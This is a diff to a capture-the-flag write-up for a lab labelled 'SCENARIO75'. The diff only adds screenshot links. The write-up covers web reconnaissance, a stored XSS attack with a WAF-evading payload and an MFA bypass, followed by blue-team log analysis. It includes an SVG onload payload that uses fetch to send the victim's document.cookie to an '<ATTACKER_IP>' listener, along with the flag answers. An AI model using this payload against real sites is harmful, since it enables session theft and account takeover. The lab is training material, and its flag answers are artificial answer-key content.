@@ -15,6 +15,7 @@ Perform banner-grabbing against the target server to inspect the HTTP header inf
 ```bash id="5nj7bw"
 curl -I http://192.168.1.8:3075/
 ```
+<img width="711" height="177" alt="image" src="https://github.com/user-attachments/assets/abf4ab9a-8cb5-476b-8d84-64476a0faa1f" />
 
 ### Finding
 
@@ -39,6 +40,7 @@ Open the main page:
 ```text id="1o1q0v"
 http://192.168.1.8:3075/
 ```
+<img width="843" height="220" alt="image" src="https://github.com/user-attachments/assets/c20c1d30-47a3-476c-923f-15af5eb6556b" />
 
 Using a browser:
 
@@ -57,6 +59,7 @@ Access:
 ```text id="iq5f6z"
 http://192.168.1.8:3075/robots.txt
 ```
+<img width="843" height="220" alt="image" src="https://github.com/user-attachments/assets/a98a70d1-5bc3-435a-8713-89a1f98cc51a" />
 
 The file disallows crawling sensitive endpoints.
 
@@ -75,6 +78,7 @@ Based on common web application structures, the attacker guesses the administrat
 ```text id="wlw30v"
 /dashboard
 ```
+<img width="824" height="492" alt="image" src="https://github.com/user-attachments/assets/169c9f1a-786e-4c7e-9001-20b9f0440e54" />
 
 🎯 Flag Revealed:
 
@@ -93,6 +97,8 @@ Open:
 * Cookies
 
 The system automatically issues a pre-authentication cookie when a user first visits the application.
+
+<img width="879" height="407" alt="image" src="https://github.com/user-attachments/assets/2c00cf23-72e3-4902-8596-e6f053fa501b" />
 
 🎯 Cookie Name Flag:
 
@@ -115,6 +121,8 @@ SCENARIO75{pending_mfa_verification}
 Inspect the `<form>` tag on the main page.
 The feedback input must be submitted using a specific HTTP method.
 
+<img width="758" height="89" alt="image" src="https://github.com/user-attachments/assets/c28f55e0-c358-4459-8993-de776e823093" />
+
 🎯 Flag Revealed:
 
 ```text id="lvjlwm"
@@ -132,6 +140,8 @@ Inject a standard Cross-Site Scripting (XSS) payload into the feedback form:
 ```
 
 ### Result
+
+<img width="758" height="239" alt="image" src="https://github.com/user-attachments/assets/e3059a2c-5ef4-47ec-9716-6d8074e30669" />
 
 The application blocks the request and returns:
 
@@ -178,6 +188,8 @@ SCENARIO75{window['docu'+'ment']['coo'+'kie']}
 
 Because the cookie `HttpOnly` property is configured insecurely by the developer, external JavaScript is capable of reading the session cookie.
 
+<img width="1144" height="200" alt="image" src="https://github.com/user-attachments/assets/9ed0cef1-212f-41bb-af6e-51805046b8a8" />
+
 🎯 Cookie Vulnerability Flag:
 
 ```text id="0d7vqj"
@@ -186,9 +198,12 @@ SCENARIO75{False}
 
 The attacker launches a Python HTTP Server on their laptop (port 8000) as a listener, then submits the following bypass payload using the Fetch API:
 
+<img width="809" height="77" alt="image" src="https://github.com/user-attachments/assets/0d6fffff-6cb7-467b-9b01-ccefeb141640" />
+
 ```html id="7q7cyk"
 <svg onload="fetch('http://<ATTACKER_IP>:8000/?c='+window['docu'+'ment']['coo'+'kie'])">
 ```
+
 
 🎯 Transfer Mechanism Flag:
 
@@ -203,6 +218,8 @@ SCENARIO75{fetch}
 ## MFA Bypass
 
 When the Administrator opens the dashboard, the XSS payload executes and transmits the administrator session cookie — which uses a special prefix — back to the attacker’s machine.
+
+<img width="809" height="122" alt="image" src="https://github.com/user-attachments/assets/96015ec4-d732-46c5-9638-0338d5be59ea" />
 
 🎯 Session Prefix Flag:
 
@@ -228,6 +245,8 @@ Into their own browser and accesses:
 
 Because of flawed server-side session validation logic, the system immediately grants administrator access and skips the MFA gateway endpoint.
 
+<img width="1920" height="575" alt="image" src="https://github.com/user-attachments/assets/9444bef7-a75b-477e-bfd0-fa5ccfdb33a8" />
+
 🎯 MFA Bypass Endpoint Flag:
 
 ```text id="s8hxwj"
@@ -239,6 +258,8 @@ SCENARIO75{/api/verify-mfa}
 ## Execution Visualization
 
 Inside the administrator dashboard, the stored XSS payload is rendered inside a dedicated CSS container class.
+
+<img width="1033" height="145" alt="image" src="https://github.com/user-attachments/assets/94dcf973-1831-4d3b-9b5c-130daeee88fe" />
 
 🎯 CSS Container Flag:
 
@@ -276,6 +297,8 @@ The analyst inspects the default web server log directory to search for attacker
 cd /opt/admin/logs
 ```
 
+<img width="811" height="101" alt="image" src="https://github.com/user-attachments/assets/73ec3a71-2695-45c7-bc08-0e13ee3a47a1" />
+
 🎯 Log Location Flag:
 
 ```text id="3mgv4m"
@@ -295,6 +318,8 @@ cat access.log | grep "robots.txt"
 ### Finding
 
 A suspicious external IP address appears using a default penetration-testing Linux user-agent.
+
+<img width="811" height="86" alt="image" src="https://github.com/user-attachments/assets/b3e1105d-4824-4691-9661-40e54730ddd2" />
 
 🎯 Attacker IP Flag:
 
@@ -318,6 +343,8 @@ Search for successful `200 OK` access events to the sensitive `/dashboard` endpo
 cat access.log | grep "10.10.14.50" | grep "dashboard"
 ```
 
+<img width="811" height="114" alt="image" src="https://github.com/user-attachments/assets/e0f1aa42-5e36-488e-a9c8-fd13c6b32528" />
+
 🎯 Status Code Flag:
 
 ```text id="4a5c9z"
@@ -336,6 +363,8 @@ SCENARIO75{18:51:55}
 
 Inside the access log entry, a long mysterious string appears in the `X-Forwarded-For` header.
 
+<img width="800" height="77" alt="image" src="https://github.com/user-attachments/assets/b19ef458-70da-41df-b05d-8436fdcbb9c6" />
+
 🎯 Base64 String Flag:
 
 ```text id="whu76d"
@@ -349,6 +378,8 @@ SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}
 ## Legitimate Traffic Separation
 
 The analyst maps the logs to separate legitimate administrator traffic from malicious attacker traffic.
+
+<img width="811" height="422" alt="image" src="https://github.com/user-attachments/assets/bbff0850-e24c-45f6-be95-0e68da66497d" />
 
 🎯 Legitimate IP Flag:
 
@@ -371,6 +402,7 @@ The analyst opens the error log to identify when the WAF first detected and bloc
 ```bash id="pnh7m7"
 cat error.log | grep "WAF BLOCK"
 ```
+<img width="800" height="77" alt="image" src="https://github.com/user-attachments/assets/e7cd8417-c9b9-4a99-8ef6-96a7e8c18568" />
 
 🎯 Error Log Location Flag:
 
@@ -448,6 +480,8 @@ At timestamp `18:53:10`, the internal logs record a token mismatch anomaly.
 cat error.log | grep "18:53:10"
 ```
 
+<img width="800" height="98" alt="image" src="https://github.com/user-attachments/assets/c8e839fe-6598-4358-97b4-733dad9d1062" />
+
 🎯 Anomaly Timestamp Flag:
 
 ```text id="4mjlwm"
@@ -469,6 +503,8 @@ The analyst decodes the Base64 string discovered in the network header to recove
 ```bash id="1fq5h9"
 echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d
 ```
+
+<img width="811" height="72" alt="image" src="https://github.com/user-attachments/assets/449134ef-e222-4f23-a870-0b2727a854ab" />
 
 ---
 
